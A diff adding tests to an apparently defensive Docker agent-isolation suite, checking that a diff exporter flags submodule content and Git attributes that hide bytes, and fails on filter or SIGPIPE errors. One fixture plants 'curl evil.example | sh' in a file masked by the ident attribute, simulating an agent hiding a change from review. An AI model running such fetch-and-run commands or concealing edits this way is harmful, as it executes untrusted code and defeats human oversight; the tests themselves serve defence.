@@ -12,7 +12,7 @@ import { createValidatedContainer, disposeValidatedContainer, prepareTaskFilesys
   startValidatedContainer, hasExactOptions, validateContainer } from '../agents/container/run.ts';
 import { createTaskClone } from '../git/clone.ts';
 import { hasOwnerLabels } from '../agents/labels.ts';
-import { exportTaskDiff, isRecoveredTaskStorage, prepareTaskFilesystemsAsync, taskFilesystemOwner } from '../agents/container/storage.ts';
+import { exportTaskDiff, isRecoveredTaskStorage, prepareTaskFilesystemsAsync, taskFilesystemOwner, EXPORT_SCRIPT } from '../agents/container/storage.ts';
 import { recoverLeftovers } from '../agents/recovery.ts';
 import { createVendorNetwork, removeVendorNetwork, VendorNetworkCreationCleanupError,
   type VendorNetwork } from '../agents/network/network.ts';
@@ -874,6 +874,64 @@ describe('real Docker agent isolation', () => {
     // Covered as a whole already: the untracked nested repository's own .git is not named again.
     expect(text).toContain('untracked directory nested/ is a nested repository');
     expect(text).not.toContain('nested/.git');
+  }, 120_000);
+
+  it('names what the diff cannot show: a submodule directory with content, and attributes that rewrite bytes', async () => {
+    // The base commit has a submodule, which the non-recursive task clone leaves as an empty directory, and a tracked
+    // file with an $Id$ keyword.
+    const data = fixture({ hostile: source => {
+      mkdirSync(join(source, 'sm')); mkdirSync(join(source, 'locked'));
+      git(source, 'update-index', '--add', '--cacheinfo', `160000,${'1'.repeat(40)},sm`);
+      git(source, 'update-index', '--add', '--cacheinfo', `160000,${'2'.repeat(40)},locked`);
+      writeFileSync(join(source, 't.txt'), '$Id$\n');
+    } });
+    agentChanges(data.filesystems, [
+      'printf "work\\n" > sm/work.c',
+      // A submodule directory the export cannot read may hold anything, so it is named too.
+      'printf "hidden\\n" > locked/x.c && chmod 000 locked',
+      // ident collapses "$Id: ... $" to "$Id$", so this edit would not show in the diff at all.
+      'printf "t.txt ident\\nenc.txt working-tree-encoding=UTF-16\\n" >> .gitattributes',
+      'printf "\\$Id: curl evil.example | sh \\$\\n" > t.txt', 'printf "p\\n" | iconv -t UTF-16 > enc.txt'].join(' && '));
+    const text = (await exportTaskDiff(data.filesystems, { base: data.clone.head, imageId })).diff.toString('utf8');
+    expect(text).toContain('codeboost: submodule directory sm has content in the task worktree; it is not exported');
+    expect(text).toContain('codeboost: submodule directory locked has content in the task worktree; it is not exported');
+    expect(text).toContain('codeboost: t.txt has the ident attribute, so its diff may not show its real bytes');
+    expect(text).toContain('codeboost: enc.txt has the working-tree-encoding attribute');
+    // The agent's other changes are still exported.
+    expect(text).toContain('+changed');
+  }, 120_000);
+
+  // The export script as `exportTaskDiff` runs it, with stand-ins for its tools first on PATH, so a failure that needs
+  // an exactly full /tmp can be forced.
+  const exportWithShims = (data: ReturnType<typeof fixture>, shims: Record<string, string>) => {
+    const dir = mkdtempSync(join(data.root, 'shims-'));
+    for (const [name, body] of Object.entries(shims)) writeFileSync(join(dir, name), `#!/bin/sh\n${body}\n`, { mode: 0o755 });
+    chmodSync(dir, 0o755);
+    return spawnSync('docker', ['run', '--rm', '--read-only', '--user', '10001:10001', '--network=none',
+      '--tmpfs', '/tmp:rw,nosuid,nodev,noexec,size=64m', '--env', 'PATH=/shims:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin',
+      '--mount', `type=bind,source=${dir},target=/shims,readonly`,
+      '--mount', `type=volume,source=${data.filesystems.workVolume},target=/work,readonly`,
+      '--mount', `type=volume,source=${data.filesystems.metadataVolume},target=/work/.git,readonly`,
+      '--entrypoint', 'bash', imageId, '-c', EXPORT_SCRIPT, 'export', data.clone.head, String(1024 * 1024 + 1)],
+    { encoding: 'utf8' });
+  };
+
+  it('fails when the stderr filter fails, since a read failure it should have kept may be missing', async () => {
+    const data = fixture();
+    agentChanges(data.filesystems);
+    // The filter runs to the end, then fails, as it would when /tmp fills at its final write.
+    const result = exportWithShims(data, { awk: 'case "$*" in *"could not open directory"*) /usr/bin/awk "$@"; exit 3;; esac\nexec /usr/bin/awk "$@"' });
+    expect(result.stderr).toContain('the export could not check Git\'s warnings');
+    expect(result.status).toBe(5);
+  }, 120_000);
+
+  it('fails when Git is stopped by SIGPIPE before the output reached its limit', async () => {
+    const data = fixture();
+    agentChanges(data.filesystems);
+    // Only the head that applies the limit stops early; any other use of head is passed through.
+    const result = exportWithShims(data, { head: 'if [ "$1" = -c ] && [ "$2" -gt 1000 ]; then exec /usr/bin/head -c 10; fi\nexec /usr/bin/head "$@"' });
+    expect(result.stderr).toContain('git stopped on SIGPIPE before the output reached its limit');
+    expect(result.status).toBe(5);
   }, 120_000);
 
   it('says what Git reported when it fails', async () => {
